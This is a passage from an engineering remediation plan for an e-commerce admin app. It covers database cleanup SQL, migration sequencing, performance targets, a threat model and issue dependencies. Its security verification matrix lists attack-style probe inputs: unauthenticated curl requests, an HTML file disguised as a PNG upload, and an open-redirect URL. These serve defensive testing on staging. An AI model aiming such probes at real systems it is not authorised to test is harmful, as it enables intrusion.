| Q2 | Duplicate / conflicting indexes (DB-002, DB-016) | `SELECT tablename, indexname, indexdef FROM pg_indexes WHERE schemaname='public' ORDER BY tablename, indexname;` |
| Q3 | Order-number shape and max numeric suffix (BUG-005, DB-008) | `SELECT count(*) AS total, count(*) FILTER (WHERE order_number ~ '^SX-[0-9]{1,4}$') AS short_numeric, max(substring(order_number from 4)::bigint) FILTER (WHERE order_number ~ '^SX-[0-9]+$') AS max_suffix FROM orders;` |
| Q4 | Coupon case-variants (DB-003) | `SELECT upper(code) AS norm, count(*) AS n, array_agg(code) AS variants FROM coupons GROUP BY 1 HAVING count(*) > 1;` |
| Q5 | Invalid movement reasons / day ranges (DB-004) | `SELECT DISTINCT reason FROM inventory_movements WHERE reason NOT IN ('restock','sale','cancellation','adjustment','return');` and `SELECT id, min_days, max_days, estimated_days FROM shipping_methods WHERE min_days < 0 OR max_days < 0 OR estimated_days < 0 OR (min_days IS NOT NULL AND max_days IS NOT NULL AND max_days < min_days);` |
| Q6 | SVG assets in the DB (SEC-006) | `SELECT id, product_id, url FROM product_images WHERE url ILIKE '%.svg%';` |
| Q7 | Payment proofs not on the CDN (SEC-014) | `SELECT id, order_id, proof_url FROM payments WHERE proof_url IS NOT NULL AND proof_url NOT ILIKE 'https://ik.imagekit.io/%';` |
| Q8 | Fabricated image IDs (BUG-021, DB-009) | `SELECT count(*) FROM product_images WHERE imagekit_file_id ~ '^img-[0-9]+-[0-9a-z]+$';` |
| Q9 | Customers linkable to auth users (DB-010) | `SELECT count(*) FROM customers c JOIN ba_user u ON lower(trim(c.email))=lower(trim(u.email)) WHERE c.user_id IS NULL;` |
| Q10 | Roles actually present (SEC-004) | `SELECT role, count(*) FROM ba_user GROUP BY role;` |
| Q11 | Duplicate transaction references (DB-013, ECOM-006) | `SELECT payment_method_id, transaction_reference, count(*) FROM payments WHERE transaction_reference IS NOT NULL AND transaction_reference <> '' GROUP BY 1,2 HAVING count(*) > 1;` |
| Q12 | Legacy customer notes to split (DB-011) | `SELECT count(*) FROM customers WHERE notes IS NOT NULL AND trim(notes) <> '';` |
| Q13 | Payments already refunded (DB-005 backfill) | `SELECT count(*) FROM payments WHERE status='refunded';` |

**If any of Q1, Q3, Q4, Q11 returns rows, stop and resolve the data before writing the corresponding constraint.** If Q10 shows a role outside `{super_admin, admin, staff, customer}`, SEC-004 will lock those users out — decide their correct role first.

## 8.3 Duplicate resolution procedures

Each procedure runs inside a transaction with a verified backup taken immediately before. None of them delete data that is referenced without first repointing references.

### D1 — Duplicate customers (DB-001)

```sql
BEGIN;
-- 1. Choose survivor: most orders, then oldest. Inspect, do not automate blindly.
WITH grouped AS (
  SELECT lower(trim(email)) AS norm, count(*) AS n FROM customers GROUP BY 1 HAVING count(*) > 1
)
SELECT c.id, c.email, c.created_at,
       (SELECT count(*) FROM orders o WHERE o.customer_id = c.id) AS orders,
       (SELECT count(*) FROM addresses a WHERE a.customer_id = c.id) AS addresses
FROM customers c JOIN grouped g ON lower(trim(c.email)) = g.norm
ORDER BY g.norm, orders DESC, c.created_at ASC;

-- 2. After humans choose survivors, repoint then delete (per group, explicit ids):
UPDATE orders    SET customer_id = '<survivor>' WHERE customer_id = '<loser>';
UPDATE addresses SET customer_id = '<survivor>' WHERE customer_id = '<loser>';
DELETE FROM customers WHERE id = '<loser>';
COMMIT;
```

### D2 — Coupon case variants (DB-003)

```sql
BEGIN;
UPDATE order_coupons oc SET coupon_id = '<survivor>'
WHERE oc.coupon_id = '<variant>'
  AND NOT EXISTS (SELECT 1 FROM order_coupons x WHERE x.order_id = oc.order_id AND x.coupon_id = '<survivor>');
-- If a variant redemption collides with an existing survivor row for the same order,
-- delete the duplicate link instead (it is the same redemption recorded twice):
DELETE FROM order_coupons WHERE coupon_id = '<variant>'
  AND order_id IN (SELECT order_id FROM order_coupons WHERE coupon_id = '<survivor>');
UPDATE coupons SET usage_count = usage_count + (SELECT usage_count FROM coupons WHERE id = '<variant>')
WHERE id = '<survivor>';
DELETE FROM coupons WHERE id = '<variant>';
COMMIT;
```

Record the summed `usage_count` arithmetic in the migration comment — it is an auditable decision.

### D3 — Invalid movement reasons (DB-004)

```sql
BEGIN;
UPDATE inventory_movements SET reason = 'adjustment'
WHERE reason NOT IN ('restock','sale','cancellation','adjustment','return');
COMMIT;
```

Never delete ledger rows. If the intent of an old value is unclear, `adjustment` is the honest bucket and the change is recorded.

### D4 — Fabricated image IDs (DB-009 / BUG-021)

```sql
BEGIN;
UPDATE product_images SET imagekit_file_id = NULL
WHERE imagekit_file_id ~ '^img-[0-9]+-[0-9a-z]+$'
  AND url NOT ILIKE 'https://ik.imagekit.io/%';
COMMIT;
```

Rows whose URL *is* on ImageKit keep their (possibly wrong but non-fabricated) ID for manual review.

### D5 — Order-number sequence advance (BUG-005 / DB-008)

```sql
-- After Q3, with N = max numeric suffix:
SELECT setval('order_number_seq', GREATEST(1001, <N> + 1), false);
```

No order row is modified.

## 8.4 Rollback strategy per migration

| Migration | Reversible? | Rollback |
|---|---|---|
| Add nullable columns (`refund_amount`, `released_at`, `media_uploads.…`) | Yes | `ALTER TABLE … DROP COLUMN` (data loss confined to the new feature) |
| Add CHECK `NOT VALID` | Yes | `ALTER TABLE … DROP CONSTRAINT …` |
| `VALIDATE CONSTRAINT` | Not reversible | Forward-only; validation does not change data |
| Add index `CONCURRENTLY` | Yes | `DROP INDEX CONCURRENTLY …` |
| Add unique index | Yes | `DROP INDEX CONCURRENTLY …` |
| Backfill (coupon recount, note split) | **No** | Requires the pre-migration backup; document the restore procedure |
| `DROP NOT NULL` | Yes | `SET NOT NULL` **only** if no nulls exist |
| New tables (`customer_notes`, `audit_logs`, `order_returns`, `media_uploads`) | Yes | `DROP TABLE` (loses the feature's data only) |

Backfill migrations must state, in the header: "Irreversible. Backup required. Verified by query X."

## 8.5 Locking and downtime

| Operation | Lock | Expected impact | Mitigation |
|---|---|---|---|
| `ADD COLUMN` (nullable, no default) | `ACCESS EXCLUSIVE` (metadata only) | milliseconds | None needed |
| `ADD COLUMN … DEFAULT <const>` (PG 11+) | metadata only | milliseconds | None needed |
| `ALTER COLUMN … DROP NOT NULL` | `ACCESS EXCLUSIVE` (catalog) | milliseconds | None needed |
| `ADD CONSTRAINT … CHECK … NOT VALID` | `ACCESS EXCLUSIVE` (catalog) | milliseconds | None needed |
| `VALIDATE CONSTRAINT` | `SHARE UPDATE EXCLUSIVE` | scans the table, blocks only DDL | Run off-peak; monitor |
| `CREATE INDEX` (no CONCURRENTLY) | `SHARE` — **blocks writes** | whole build duration | Never use on live tables |
| `CREATE INDEX CONCURRENTLY` | `SHARE UPDATE EXCLUSIVE` | no write blocking; longer wall time | Use `IF NOT EXISTS`; resumable |
| `CREATE UNIQUE INDEX CONCURRENTLY` | `SHARE UPDATE EXCLUSIVE` | fails if duplicates appear during the build | Freeze the write path (e.g. disable coupon creation) during the build, or run immediately after cleanup |
| `DROP INDEX CONCURRENTLY` | `SHARE UPDATE EXCLUSIVE` | none | Preferred over plain `DROP INDEX` |

**Lock timeout hygiene:** every migration that takes `ACCESS EXCLUSIVE` should begin with:
```sql
SET lock_timeout = '5s';
SET statement_timeout = '60s';   -- raise only for VALIDATE
```
so a long-running query cannot queue the migration behind itself and stall the whole app.

## 8.6 Migration sequencing

Files are applied in lexical order by `src/db/migrate.ts`. Use these timestamps (`2026-11-08` onward) and this order:

| # | File | Content | Mode | Depends on |
|---|---|---|---|---|
| 1 | `20261108120000_runner_support.sql` | `_app_migrations` gains `non_transactional`, `checksum` | transactional | — (also requires the `migrate.ts` change, DB-015) |
| 2 | `20261108120100_payment_refunds.sql` | `refund_amount`, `refunded_at`, `refunded_by` + CHECK (`NOT VALID` → `VALIDATE`) | transactional | DB-005 |
| 3 | `20261108120200_coupon_release.sql` | `released_at`, `release_reason`, index | transactional | DB-007 |
| 4 | `20261108120300_catalog_integrity.sql` | `product_images.imagekit_file_id DROP NOT NULL` | transactional | DB-009 (after D4) |
| 5 | `20261108120400_check_constraints.sql` | movement reason + shipping days CHECK (`NOT VALID` → `VALIDATE`) | transactional | DB-004 (after D3) |
| 6 | `20261108120500_customer_notes.sql` | table + index + RLS + one-time backfill split | transactional | DB-011 (after Q12) |
| 7 | `20261108120600_unique_customer_email.sql` | Q1 must be clean → `CREATE UNIQUE INDEX CONCURRENTLY` | **no-transaction** | DB-001 (after D1) |
| 8 | `20261108120700_unique_coupon_code.sql` | CHECK upper + Q4 clean → unique functional index `CONCURRENTLY` | **no-transaction** | DB-003 (after D2) |
| 9 | `20261108120800_performance_indexes.sql` | six composite indexes `CONCURRENTLY` | **no-transaction** | DB-006 |
| 10 | `20261108120900_payment_txn_reference.sql` | supporting index + (deferred) unique index | **no-transaction** | DB-013 (after Q11) |
| 11 | `20261108121000_audit_logs.sql` | table + three indexes + RLS | transactional | DB-014 |
| 12 | `20261108121100_media_uploads.sql` | table + partial index | transactional | ECOM-008 |
| 13 | `20261108121200_returns.sql` | `order_returns`, `order_return_items` | transactional | ECOM-002 |
| 14 | `20261108121300_notification_reads.sql` | read-state table | transactional | ECOM-011 |
| 15 | `20261108121400_order_payment_due.sql` | backfill `payment_due_at` for open orders + index | transactional | ECOM-001 |

**Rules for this ordering:**
- Every `CONCURRENTLY` file must be non-transactional (DB-015) and must **not** be in the same file as any other statement that requires a transaction.
- Never place a unique-index creation before its cleanup migration.
- Never place two `CONCURRENTLY` statements for the same table in one file if a failure of the second would leave an invalid index — PostgreSQL marks a failed concurrent build as `INVALID`; the migration must begin with `DROP INDEX CONCURRENTLY IF EXISTS` for that index name to make it resumable.

## 8.7 Drizzle schema changes (must accompany each migration)

| File | Change | Migration |
|---|---|---|
| `src/db/schema/customers.ts` | remove `.unique()` on `email`; add `uniqueIndex` on `lower(trim(email))` | 7 |
| `src/db/schema/coupons.ts` | `uniqueIndex` on `upper(code)`; CHECK `code = upper(code)` | 8 |
| `src/db/schema/orders.ts` | `unique()` on `idempotencyKey` (replacing the partial index) | DB-002 (pairs with 9) |
| `src/db/schema/payments.ts` | add `refundAmount`, `refundedAt`, `refundedBy` | 2 |
| `src/db/schema/catalog.ts` | `imagekitFileId` nullable; add `(product_id, price)` index on variants | 4, 9 |
| `src/db/schema/inventory.ts` | add `(updated_at)` index; reason CHECK already present | 5, 9 |
| `src/db/schema/shipping.ts` | day-range CHECKs already present | 5 |
| `src/db/schema/customer-notes.ts` (new) | mirror `customer_notes` | 6 |
| `src/db/schema/audit-logs.ts` (new) | mirror `audit_logs` | 11 |
| `src/db/schema/media.ts` (new) | mirror `media_uploads` | 12 |
| `src/db/schema/returns.ts` (new) | mirror returns tables | 13 |
| `src/db/schema/index.ts` | export the four new modules | — |

After every change: `npm run db:parity` must pass, and `drizzle-kit generate` must produce **no** diff for the objects just migrated (proving SQL and Drizzle agree). If `generate` wants to create something, the two definitions still disagree — fix the source, not the generated output.

## 8.8 Verification after migration

```bash
npm run db:migrate            # applies pending files, records checksums
npm run db:parity             # SQL ↔ Drizzle
npm run db:integrity          # existing integrity script
psql "$DATABASE_URL" -c "\d+ customers"     # spot-check the unique index
npm test -- integration       # includes the constraint tests from TEST-004
```

Expected: parity green, integrity green, the new constraint present, and the negative tests (inserting a duplicate email / invalid reason) rejected by the database.

---

# 9. Performance Optimization Plan

> **No measurement in this section is a claim.** Where a number appears it is a **target** to verify with the harness in §9.6, not a measured result. The only measured facts in this document are the baseline build/lint/type-check outcomes in §2.3 and the `npm audit` count.

## 9.1 Current cost model (derived by counting queries in source, not measured)

| Surface | Queries per request (static count) | Source |
|---|---|---|
| Any page (root layout) | 6 | `src/app/layout.tsx:55-135` |
| `/` (dashboard) | 6 + 5 sequential + up to 5 inside `getOrders` | `layout.tsx`, `app/page.tsx:44-98`, `product.repository` follow-ups |
| `/products` | 6 + 1 count + 1 page + 3 follow-ups | `product.repository.ts:154-290` |
| `/orders` | 6 + 1 count + 1 grouped page (correlated subquery per row) | `order.repository.ts:104-235` |
| `/orders/[id]` | 6 + 8 sequential + N (engravings per item) + a **second** full `findById` from `generateMetadata` | `order.repository.ts:249-388`, `orders/[id]/page.tsx` |
| `/payments` | 6 + count + page | `payment.repository.ts:59-165` |
| `/coupons` | 6 + **unbounded full-table select** | `coupon.repository.ts:78-105` |
| `/customers` | 6 + count + grouped page | `customer.repository.ts:96-128` |

`/orders/[id]` is the worst case and the one worth fixing first: 8 fixed queries plus one per line item, executed twice.

## 9.2 Parallelisation

Independent queries must be issued concurrently. Concretely:

| Location | Change | Target |
|---|---|---|
| `src/app/page.tsx` | 5 sequential awaits → one `Promise.all` | 5 round trips → 1 |
| `src/app/layout.tsx` | 6 queries → 1 combined counter query + 1 notification query, both in one `Promise.all` | 6 → 2 |
| `product.repository.findPaginated` | colours / variants / images issued in parallel | 5 → 3 (or 2 with §9.4) |
| `order.repository.findById` | customer, payment method, shipping method, items, payments, coupons, notes, history → parallel | 8 → ~4 |
| `customers/[id]/page.tsx` | already parallel (`Promise.all` of bundle + orders) — leave as is | — |

Rule: only parallelise queries that do **not** depend on each other's results, and never parallelise inside a transaction in a way that changes lock acquisition order (BUG-004). Reads inside a transaction may be parallelised only when they take no locks.

## 9.3 Query consolidation

| Pattern | Current | Replacement |
|---|---|---|
| Four shell counters | 4 `SELECT count/sum` | 1 `SELECT` with 4 scalar subqueries (§PERF-001) |
| Two product counts | 2 queries | 1 with `count(*) FILTER (WHERE …)` |
| Product page + total | 2 queries | 1 with `count(*) OVER()` |
| Order list latest payment | correlated subquery per row | `LEFT JOIN LATERAL … LIMIT 1` |
| Order list item count | `LEFT JOIN order_items` + `GROUP BY` | `LEFT JOIN LATERAL (SELECT sum(quantity) …)` |
| Order detail engravings | 1 query per line item (N+1) | 1 query `WHERE order_item_id = ANY($1)` |
| Customer activity feed (ECOM-010) | would be 4 queries | 1 `UNION ALL` |
| Dashboard buckets | client-side over 100 rows | 1 `GROUP BY date_trunc` (§BUG-028) |

## 9.4 Pagination

- **Every** list endpoint takes `page`/`limit` bounded by the existing Zod `max(100)`; default 20.
- Keyset pagination for feeds where the ordering is stable (`audit_logs`, customer activity, inventory movements): `WHERE (created_at, id) < ($cursor_ts, $cursor_id) ORDER BY created_at DESC, id DESC LIMIT n`. Offset pagination for tables where the user jumps to a page number.
- Never paginate in the browser (BUG-033).
- Never page a result set that was filtered in memory (BUG-030).

## 9.5 Caching (conservative by design)

| Data | Cache? | Mechanism | Invalidation | Rationale |
|---|---|---|---|---|
| Shell badge counts | **Request-scoped only** | React `cache()` | n/a (per request) | Cheap; must be live; no cross-request staleness acceptable |
| Product list rows | No (dynamic) | — | — | Stock is embedded in the row |
| Product stock / inventory | **Never cache** | — | — | Correctness (Safety Rule: no stale inventory) |
| Order / payment state | **Never cache** | — | — | Financial correctness |
| Coupon status | No | — | — | Time-dependent (`starts_at`/`expires_at`) |
| Store settings | Optional, tag-invalidated | `unstable_cache` + `revalidateTag('settings')` | On `updateSettingsBatch` | Low churn, safe to be seconds stale |
| Static reference data (categories tree, shipping methods, engraving options, payment method display) | Optional, tag-invalidated | `unstable_cache` + tag per entity | On each corresponding mutation | Rarely changes; already revalidated by `revalidatePath` in actions |
| Dashboard aggregates | No | — | — | Operational decisions require current numbers |

**Rules:**
1. Any cache introduced must have a named invalidation trigger in the same change set. A cache without invalidation is a bug.
2. `revalidatePath` calls already exist in the actions — when adding `unstable_cache`, convert these to `revalidateTag` for the affected entity, and keep `revalidatePath` for the router cache.
3. Do not cache anything that participates in a transaction's decision (stock availability, coupon validity, payment status).
4. Measure before adding any cache; a cache is a complexity cost (Safety Rule 8).

## 9.6 Query-count measurement harness

Targets require counting. Add a development-only counter in `src/db/index.ts`:

```ts
// enabled only when DB_QUERY_LOG=1
let queryCount = 0;
export function resetQueryCount() { queryCount = 0; }
export function getQueryCount() { return queryCount; }
```

(With Drizzle, wrap the client via `drizzle(client, { logger: { logQuery: () => { queryCount++; } } })` — verify the available option name for `drizzle-orm@0.38`; if the logger hook is unavailable, use a `postgres.js` `debug` callback and count completed queries.)

Then assert in integration tests (TEST-001) and log the count in development on each RSC render. Record actual counts in `docs/ai-context/IMPLEMENTATION_LOG.md`.

### Query-count targets (to be **verified**, not assumed)

| Page | Baseline count (static) | Target | Notes |
|---|---|---|---|
| Any page — shell contribution | 6 | **≤ 2** | PERF-001 |
| `/` dashboard | 6 shell + 5 sequential + list internals | **≤ 6 total** | Shell 2 + metrics 1 + inventory summary 1 + low stock 1 + buckets 1 |
| `/products` | 6 + 5 | **≤ 5 total** | Shell 2 + count/page 1 + related 2 |
| `/orders` | 6 + 2 (with per-row subquery) | **≤ 4 total** | Shell 2 + count 1 + page 1 |
| `/orders/[id]` | 6 + 8 + N + 8 (metadata) | **≤ 8 total** | Shell 2 + bundle ~5 + 1 metadata (cached) |
| `/payments` | 6 + 2 | **≤ 4 total** | |
| `/coupons` | 6 + 1 unbounded | **≤ 4 total** | Bounded query required |
| `/customers` | 6 + 2 | **≤ 5 total** | |

If a target proves unreachable without compromising correctness, record the achieved number and the reason — do not silently relax the target.

## 9.7 Connection management

- `max` is per process; the invariant is `instances × max ≤ pooler_limit − reserve` (§PERF-009). It must be documented with the actual Supavisor pool size (**prerequisite**).
- Reduce **hold time** before raising `max`: fewer queries per request (9.2–9.4) is the safe lever.
- No network I/O inside `db.transaction` (ImageKit deletes, email, HTTP). Verify with a static check.
- Transactions must be short: `approvePayment` and `createOrder` target < 500 ms on staging, measured.
- `prepare: false`, `idle_timeout`, `max_lifetime` stay as configured (ADR 007).

## 9.8 Guarding against stale operational data

| Risk | Mitigation |
|---|---|
| Dashboard shows old revenue | `dynamic = "force-dynamic"`, no `unstable_cache` on aggregates |
| Inventory badge stale | request-scoped cache only |
| Two tabs disagree | Both re-fetch on navigation; no client-side cross-tab cache of server state |
| Coupon appears active after expiry | Status derived in SQL from `now()` (§BUG-030), never cached |
| Order list shows stale payment status | Payment status joined in the list query, not stored denormalised |

---

# 10. Security Remediation Plan

## 10.1 Threat model (this application)

- **Assets:** customer PII (name, phone, address), payment proofs (bank screenshots), order/pricing data, inventory accuracy, store settings containing bank account details, admin accounts.
- **Actors:** unauthenticated internet, authenticated non-staff (misconfigured `ba_user` role), staff (insider, least trust), admin, super_admin, an attacker holding a leaked credential.
- **Entry points:** `/login`, `/api/auth/*`, `/api/upload/auth`, all Server Actions (callable directly by ID), all RSC pages, the ImageKit CDN.
- **Out of scope:** the storefront, Supabase Auth/Storage, physical security, and network-level DDoS (not applicable to this repo).

## 10.2 Control objectives → issues

| Objective | Issues |
|---|---|
| O1 — No path from unauthenticated to authenticated without a password | SEC-001, SEC-002, SEC-003 |
| O2 — Authenticated ≠ authorized; non-staff cannot reach admin surfaces | SEC-004, SEC-005, SEC-013, ARCH-001, ARCH-003 |
| O3 — Uploaded content cannot execute or impersonate another type | SEC-006, SEC-007 |
| O4 — No open redirects or navigation-based attacks | SEC-008, BUG-032 |
| O5 — Destructive operations are scoped and authorized | SEC-009, SEC-013 |
| O6 — Sensitive data is not publicly addressable | SEC-014 |
| O7 — Browser hardening (headers, CSP) | SEC-010 |
| O8 — Abuse resistance (rate limits, matcher correctness) | SEC-011 |
| O9 — No internal detail leaks to users | SEC-012 |
| O10 — Regressions are prevented | TEST-002, TEST-005, TEST-006 |
| O11 — Actions are attributable | DB-014 |

## 10.3 Ordered remediation sequence

1. **Contain** (minutes): delete `/api/auth/verify` (SEC-001); rotate `BETTER_AUTH_SECRET` and the admin password in every deployed environment (SEC-002, SEC-003). Rotation invalidates all sessions — expected and intended.
2. **Close escalation** (hours): SEC-004 + ARCH-001 together; then SEC-005, SEC-013.
3. **Close media abuse** (days): SEC-006, SEC-007, SEC-009 (with BUG-017).
4. **Close navigation and data exposure**: SEC-008, SEC-014, BUG-032.
5. **Harden**: SEC-010, SEC-011, SEC-012.
6. **Prove**: TEST-002, TEST-005, TEST-006; then DB-014 for attribution.

## 10.4 Verification procedure (manual, before automation exists)

Run against staging with a seeded database:

| # | Check | Expected |
|---|---|---|
| V1 | `curl -i /api/auth/verify` | `404` |
| V2 | `curl -i /api/upload/auth` (no cookie) | `401` JSON |
| V3 | Sign in as a `customer`-role user; `GET /` | `307 /login?error=forbidden` |
| V4 | Same user calls `createOrderAction` via the UI | `FORBIDDEN` toast, no order created |
| V5 | Upload `logo.svg` | rejected |
| V6 | Upload an HTML file named `x.png` | rejected |
| V7 | `GET /login?from=https://example.com`, sign in | lands on `/` |
| V8 | Delete an image from an unsaved product, navigate away | file still exists in ImageKit |
| V9 | `curl -I /` | five security headers + CSP-Report-Only |
| V10 | 11 failed sign-ins | `429` |
| V11 | Trigger a DB error | generic message + digest, no SQL text |
| V12 | `admin` (not super) opens `/settings` | blocked |
| V13 | Check `pg_stat_activity` during V4 | no long-held transaction |

## 10.5 Residual risks after this plan

| Risk | Why it remains | Owner action |
|---|---|---|
| ImageKit URLs for proofs are public if the plan lacks private files | ImageKit capability unknown (**prerequisite**) | Enable private files or move proofs to a signed-URL store; record the decision |
| In-memory rate limiting is per instance | No shared store provisioned | Add Redis/Upstash if multi-instance (documented prerequisite) |
| CSP remains report-only | Inline scripts from Next.js | Tighten after report data is clean |
| No MFA for admin accounts | Not in scope | Record as a follow-up ADR |
| Secrets are env-based with no rotation policy | Platform-dependent | Document a rotation schedule |

---

# 11. Testing and Acceptance Criteria

## 11.1 Test pyramid for this project

| Layer | Tool | Scope | Speed |
|---|---|---|---|
| Static | `tsc`, `eslint`, `scripts/check-guards.mjs` | types, style, project-specific hazards | seconds |
| Unit | Vitest | `src/lib/*`, `src/server/validation/*`, `errors.ts` | ms |
| Integration | Vitest + Postgres | services, repositories, constraints, transactions, concurrency | seconds–minutes |
| E2E | Playwright | login, product create, payment approve, cancel+refund | minutes |
| Security | Playwright + HTTP assertions | the V1–V13 matrix | minutes |
| Performance | query-count assertions + load script | §9.6 targets, §TEST-007 | minutes |

## 11.2 Per-phase exit criteria

| Phase | Must pass before proceeding |
|---|---|
| 0 | Clean tree; `tsc`/lint/build green; audit triaged; pre-flight queries recorded |
| 1 | V1–V4, V7 pass; TEST-002 (auth matrix) green; no secret literal in the repo |
| 2 | TEST-004 (concurrency) green; all P0 business-logic acceptance criteria ticked |
| 3 | Query-count targets met or explained; `db:parity` green; TEST-003 green |
| 4 | No unused dependency; no memory leak in the uploader; PERF-008 bundle reduction recorded |
| 5 | Each ECOM issue's acceptance criteria ticked independently |
| 6 | Full suite green in CI; V1–V13 automated; load baseline recorded |

## 11.3 Acceptance criteria conventions

- Every issue's *Acceptance Criteria* is a checklist of observable conditions, not of code changes.
- "Implemented" requires the code; "Verified" requires the test or manual step; "Completed" requires both plus the doc update.
- A criterion that cannot be verified in the current environment is marked `PREREQUISITE: <what is needed>` and the issue **cannot** reach `Completed`.

## 11.4 Known verification blockers (carry into §15)

| Blocker | Blocks |
|---|---|
| No production DB read access | Q1–Q13, DB-001/003/008/013/016, SEC-004 role census |
| No ImageKit dashboard/credentials | SEC-005/006/007 end-to-end, ECOM-008 purge verification |
| No Supavisor pool size | PERF-009 |
| No deployment/scheduler platform documented | ECOM-001 trigger, §14 |
| No branch-protection access (repo settings) | ARCH-009 required check |

## 11.5 Regression suite definition of done

```
[ ] npm ci                  (no flags)
[ ] tsc --noEmit
[ ] eslint .
[ ] node scripts/check-guards.mjs
[ ] npm test                (unit + integration + concurrency)
[ ] npm run db:parity
[ ] npm run db:integrity
[ ] npm run build
[ ] npx playwright test     (e2e + security)
[ ] load script             (staging, baseline within budget)
```

---

# 12. Dependency Ordering Between Issues

## 12.1 Critical path

```
SEC-001 ─┬─► SEC-002
         └─► SEC-011 ──► ARCH-002

SEC-003 (independent, do with SEC-002)

SEC-004 ◄── ARCH-001 ──► SEC-005 ──► SEC-006 / SEC-007
   │                        │
   │                        └─► SEC-014
   ├─► SEC-013 ──► BUG-026
   └─► BUG-032 (loop must be fixed when SEC-004 lands)

BUG-002 ─┐
BUG-001 ─┼─► (single createOrder change set) ──► BUG-004 ──► BUG-005
BUG-003 ─┘                                            │
BUG-007 ◄──────────────────────────────────────────────┘
   │
   ├─► BUG-009 ──► BUG-010 ──► DB-005
   │                  │
   ├─► BUG-011 ◄──────┘
   └─► BUG-012 ──► ARCH-005

DB-001 ──► DB-008 ──► BUG-005
DB-015 ──► DB-001 / DB-003 / DB-006 / DB-013   (CONCURRENTLY support first)
DB-002 / DB-004 / DB-016 ──► DB-006

BUG-016 ──► PERF-003 ──► PERF-009
BUG-028 ──► BUG-027 ──► PERF-002
PERF-001 ──► PERF-009
BUG-033 ──► PERF-006 ──► ECOM-009

TEST-001 ──► TEST-002/003/004/005/006
ARCH-008 ──► ARCH-009 ──► TEST-005
ARCH-010 ──► (documentation correctness for every later step)
```

## 12.2 Hard dependencies (cannot start before)

| Issue | Must follow |
|---|---|
| SEC-002 | SEC-001 |
| SEC-004 | ARCH-001 must land in the same change |
| SEC-005 | SEC-004, ARCH-001 |
| SEC-006 | SEC-007 (else a renamed file bypasses it) |
| SEC-009 | BUG-017 (call sites) |
| SEC-013 | SEC-004 |
| SEC-011 | SEC-001 |
| ARCH-002 | SEC-011 |
| BUG-001/002/003/004 | one change set; BUG-004 first in review order |
| BUG-005 | DB-008 |
| BUG-007 | BUG-006 |
| BUG-009 | BUG-007, BUG-008 |
| BUG-010 | BUG-007, BUG-009, DB-005 |
| BUG-011 | BUG-009, BUG-010 |
| BUG-012 | BUG-006, BUG-009 |
| BUG-017 | SEC-009 |
| BUG-018 | BUG-021 |
| BUG-019 | BUG-018 |
| BUG-021 | DB-009 |
| BUG-022 | BUG-018, BUG-019, SEC-009 |
| BUG-025 | DB-011 |
| BUG-026 | SEC-004, SEC-013 |
| BUG-027 | BUG-028 |
| BUG-030 | — |
| BUG-033 | BUG-023 (for the `q` param) |
| BUG-034 | — |
| DB-001 | DB-015 |
| DB-003 | DB-015 |
| DB-006 | DB-015, BUG-014, BUG-016 |
| DB-013 | BUG-008 |
| DB-016 | DB-002, DB-003, DB-006, DB-015 |
| PERF-002 | BUG-028 |
| PERF-004 | BUG-030, BUG-033 |
| PERF-009 | PERF-001, PERF-002, PERF-003 |
| PERF-010 | BUG-021 |
| ARCH-007 | PERF-008 |
| ARCH-009 | ARCH-008, TEST-001, DB-015 |
| ECOM-001 | BUG-007, BUG-004 |
| ECOM-002 | BUG-010, DB-005, DB-012 |
| ECOM-003 | ECOM-002 |
| ECOM-004 | BUG-025, DB-011 |
| ECOM-005 | SEC-004, SEC-013, DB-014 |
| ECOM-006 | DB-013, BUG-008 |
| ECOM-007 | BUG-029, BUG-005 |
| ECOM-008 | SEC-007, SEC-009, BUG-021 |
| ECOM-009 | BUG-006, BUG-012, BUG-033 |
| ECOM-010 | DB-011, BUG-029 |
| ECOM-011 | PERF-001 |
| ECOM-012 | SEC-013, DB-014 |
| TEST-002 | TEST-001, SEC-004, SEC-013 |
| TEST-003 | TEST-001, BUG-029 |
| TEST-004 | TEST-001, BUG-004, BUG-007, BUG-009 |
| TEST-005 | TEST-001, ARCH-009 |
| TEST-006 | ARCH-008, ARCH-009 |

## 12.3 Cross-referenced root causes (different issues, one cause)

| Root cause | Issues sharing it | Note |
|---|---|---|
| `requiredRole` literals duplicated across action + service | SEC-004, SEC-013, BUG-026, TEST-002 | Fix once via the capability registry |
| SQL/Drizzle drift | DB-001, DB-002, DB-003, DB-004, DB-009, DB-016 | Fix via parity + one reconciliation pass |
| Client as source of truth for persisted state | BUG-018, BUG-019, BUG-021, BUG-022, BUG-025 | Fix by narrowing payloads and validating server-side |
| Status written outside the FSM | BUG-006, BUG-010, BUG-012, ARCH-005 | One FSM module, one write path |
| Missing preconditions on state transitions | BUG-008, BUG-009, BUG-011, BUG-012 | Add an explicit precondition table |
| Unbounded / in-memory list processing | BUG-030, BUG-033, PERF-004, PERF-006 | Server pagination everywhere |
| Fabricated values to satisfy types | BUG-029, SEC-014, BUG-024, BUG-016 | Widen types; never invent |
| Simulated/legacy scaffolding shipped | BUG-034, ARCH-004, ARCH-007, PERF-008 | Remove |
| Routes added before/despite ADR 019 | ARCH-002, ARCH-009 | Delete + gate in CI |

## 12.4 Suggested execution batches

| Batch | Issues | Rationale |
|---|---|---|
| B1 | SEC-001, SEC-002, SEC-003, SEC-011, ARCH-010 | Containment + documentation truth (half a day) |
| B2 | ARCH-001, SEC-004, SEC-005, SEC-013, BUG-032 | One auth change set (one day) |
| B3 | SEC-006, SEC-007, SEC-008, SEC-009, BUG-017 | Media + navigation hardening |
| B4 | BUG-001, BUG-002, BUG-003, BUG-004, BUG-005, BUG-013 | `createOrder` rewrite |
| B5 | BUG-006, BUG-007, BUG-012, ARCH-005 | FSM unification + cancellation |
| B6 | BUG-008, BUG-009, BUG-010, BUG-011, DB-005 | Payment lifecycle |
| B7 | DB-015, DB-001, DB-003, DB-004, DB-006, DB-002 | Migrations |
| B8 | BUG-014, BUG-016, BUG-030, BUG-033, PERF-003, PERF-004 | Query correctness + pagination |
| B9 | PERF-001, PERF-002, BUG-027, BUG-028, BUG-034 | Dashboard/shell |
| B10 | BUG-018, BUG-019, BUG-021, BUG-022, BUG-029 | Catalog/media payload |
| B11 | BUG-023, BUG-024, BUG-025, DB-011, BUG-026, BUG-031 | UX + honesty |
| B12 | SEC-010, SEC-012, ARCH-002, ARCH-003, ARCH-004, ARCH-006, ARCH-007, ARCH-008, PERF-010, PERF-011, PERF-012 | Cleanup/hardening |
| B13 | ECOM-001…ECOM-012 | Features, one at a time |
| B14 | TEST-001…TEST-007, ARCH-009 | Automation (start TEST-001 in B7) |

---

# 13. Risk Assessment

## 13.1 Risk register

| # | Risk | Likelihood | Impact | Mitigation | Owner |
|---|---|---|---|---|---|
